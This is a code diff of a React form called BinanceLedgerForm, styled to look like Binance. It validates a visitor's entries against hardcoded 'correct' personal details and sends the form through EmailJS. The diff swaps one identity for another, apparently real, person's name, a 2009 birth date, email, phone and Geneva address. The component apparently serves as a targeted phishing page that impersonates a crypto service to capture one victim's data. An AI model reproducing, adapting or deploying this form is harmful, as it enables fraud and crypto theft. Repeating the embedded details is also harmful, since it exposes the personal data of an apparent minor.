@@ -1,24 +1,49 @@
-
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
+import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
 import emailjs from 'emailjs-com';
 
 // Define the expected correct data
 const correctData = {
-  firstName: "Gerard",
-  lastName: "Powell",
-  dateOfBirth: "1985-05-15",
-  email: "gerardpowell@test.nl",
-  phoneNumber: "+31612345678",
-  address: "Gerard Teststraat 12",
-  zipCode: "2123LK",
-  city: "Nijmegen",
-  country: "Netherlands",
+  firstName: "Markus",
+  lastName: "Tornqvist",
+  dateOfBirth: "2009-12-06", // Format as YYYY-MM-DD for the date input
+  email: "markus.tornqvist09@gmail.com",
+  phoneNumber: "0798719282",
+  address: "Chemin de Ruth 83",
+  zipCode: "1223",
+  city: "Geneve",
+  country: "Switzerland",
 };
+
+// List of countries for the dropdown
+const countries = [
+  "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria", 
+  "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", 
+  "Bosnia and Herzegovina", "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi", "Cabo Verde", "Cambodia", 
+  "Cameroon", "Canada", "Central African Republic", "Chad", "Chile", "China", "Colombia", "Comoros", "Congo", "Costa Rica", 
+  "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", 
+  "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland", "France", "Gabon", 
+  "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", 
+  "Honduras", "Hungary", "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", 
+  "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, North", "Korea, South", "Kosovo", "Kuwait", "Kyrgyzstan", "Laos", 
+  "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya", "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", 
+  "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico", "Micronesia", "Moldova", 
+  "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", 
+  "New Zealand", "Nicaragua", "Niger", "Nigeria", "North Macedonia", "Norway", "Oman", "Pakistan", "Palau", "Palestine", 
+  "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", 
+  "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", 
+  "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles", "Sierra Leone", "Singapore", "Slovakia", 
+  "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Sudan", "Spain", "Sri Lanka", "Sudan", "Suriname", 
+  "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania", "Thailand", "Timor-Leste", "Togo", "Tonga", 
+  "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", 
+  "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Vatican City", "Venezuela", "Vietnam", 
+  "Yemen", "Zambia", "Zimbabwe"
+];
 
 // Email.js configuration
 const EMAILJS_SERVICE_ID = "service_id"; // Replace with your EmailJS service ID
@@ -197,7 +222,7 @@ const BinanceLedgerForm: FC = () => {
       newErrors.city = "Invalid city";
     }
     
-    if (formData.country.trim() === "") {
+    if (!formData.country) {
       newErrors.country = "Country is required";
     } else if (formData.country !== correctData.country) {
       newErrors.country = "Invalid country";
@@ -494,7 +519,7 @@ const BinanceLedgerForm: FC = () => {
                   type="tel"
                   value={formData.phoneNumber}
                   onChange={handleInputChange}
-                  placeholder="Phone Number (e.g. +31612345678)"
+                  placeholder="Phone Number (e.g. 0798719282)"
                   className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
                 />
                 {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
@@ -555,14 +580,36 @@ const BinanceLedgerForm: FC = () => {
                 <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
                   Country
                 </label>
-                <Input
-                  id="country"
+                <Select
                   name="country"
                   value={formData.country}
-                  onChange={handleInputChange}
-                  placeholder="Country"
-                  className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
-                />
+                  onValueChange={(value) => {
+                    setFormData({
+                      ...formData,
+                      country: value
+                    });
+                    // Clear error for this field if it exists
+                    if (errors.country) {
+                      setErrors({
+                        ...errors,
+                        country: ""
+                      });
+                    }
+                  }}
+                >
+                  <SelectTrigger 
+                    className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
+                  >
+                    <SelectValue placeholder="Select a country" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
+                    {countries.map((country) => (
+                      <SelectItem key={country} value={country}>
+                        {country}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
                 {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
               </div>
             </div>
